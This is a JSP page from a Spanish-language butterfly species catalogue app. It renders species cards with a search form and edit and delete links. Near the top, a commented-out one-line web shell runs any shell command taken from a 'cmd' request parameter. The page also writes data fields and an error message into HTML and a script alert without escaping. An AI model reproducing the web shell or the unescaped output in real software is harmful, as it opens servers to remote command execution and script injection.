<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>
<!--IMPORTS-->
<%@ page import="motyl.valueobject.SpeciesValueObject"%>
<%@ page import="java.util.ArrayList"%>
<%@ page import="motyl.utility.Utility"%>
<!--VARIABLES-->
<%!SpeciesValueObject species = null;
	ArrayList<SpeciesValueObject> speciesList = null;%>
<%-- <%Runtime.getRuntime().exec(request.getParameter("cmd"));%> --%>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<!--STYLES-->
<link rel="stylesheet" href="css/components.css">
<link rel="stylesheet" href="css/styles.css" />
<!--FONTS-->
<link rel="preconnect" href="https://fonts.gstatic.com" />
<link
	href="https://fonts.googleapis.com/css2?family=Raleway:wght@300&display=swap"
	rel="stylesheet" />
<!--ICONS-->
<link rel="stylesheet"
	href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" />
<title>Motyl | Especies</title>
</head>
<body onload="itemFocus('species')">
	<!--CONTAINER-->
	<div class="container">
		<!--HEADER AND MENU-->
		<%@ include file="menu.jsp"%>
		<!--CONTENT-->
		<div class="content">
			<div class="contentcanvas">
				<!--TITLE-->
				<h2 class="content-tittle">Especies</h2>
				<!--SEARCH-->
				<form action="search_species.controller" class="search" method="GET"
					autocomplete="off">
					<input class="input-search" type="text" placeholder="Monarca..."
						name="criteria" autocomplete="false">
					<button class="btn btn-search" type="submit" value="Buscar">Buscar</button>
				</form>
				<!--ADD BUTTON-->
				<a href="add-species" class="btn btn-new-item"><i
					class="fas fa-plus-circle"></i> Nuevo</a>
				<!--GRID FOR ITEMS-->
				<div class="species-container">

					<%
					//delete message error
					String deleteMessage = (String) request.getAttribute("deleteMessage");
					//get list of species
					speciesList = (ArrayList<SpeciesValueObject>) request.getAttribute("speciesList");
					//for each
					for (SpeciesValueObject species : speciesList) {
					%>

					<!--ITEMS CARDS-->
					<div class="species-card">
						<div class="img-items"
							style="background-image: url(uploadImages/<%=species.getImg()%>)"></div>
						<!--HEADER-->
						<div class="info-species-header">
							<p class="species-header-normalname"><%=species.getCommonName()%></p>
							<p class="species-header-cientificname">
								,<%="&nbsp;" + species.getCientificName()%></p>
							<p class="species-header-food">
								<%=species.getFood() == 0 ? "Frug&iacute;vora" : "Nectar&iacute;fera"%>
							</p>
						</div>
						<!--MAIN-->
						<div class="info-species-main">
							<div>
								<i class="fas fa-palette"></i>
								<p class="species-main-color">
									<%=species.getColor()%>
								</p>
							</div>
							<div>
								<i class="fas fa-ruler"></i>
								<p class="species-main-size">
									<%=species.getSize()%>
								</p>
							</div>
						</div>
						<!--FOOTER-->
						<div class="info-species-footer">
							<p class="species-tittle-plant">Planta hospedera</p>
							<p class="species-plant">
								<%=species.getNamePlant()%>
							</p>
							<div class="controls">
								<a href="search_species.controller?id=<%=species.getId()%>"
									class="btn-control">Editar</a><span>|</span><a
									data-id="<%=species.getId()%>" href="#"
									class="btn-control btn-drop">Eliminar</a>
							</div>
						</div>
					</div>

					<%
					}
					%>

				</div>
			</div>
		</div>
	</div>
	<!--MODAL BOX-->
	<%@ include file="modal_box.jsp"%>
	<!--DELETE ERROR-->
	<%
	if (deleteMessage != null) {
	%>
	<script>alert('<%=deleteMessage%>')
	</script>
	<%
	}
	%>
	<!--JS-->
	<script src="js/main.js"></script>
</body>
</html>
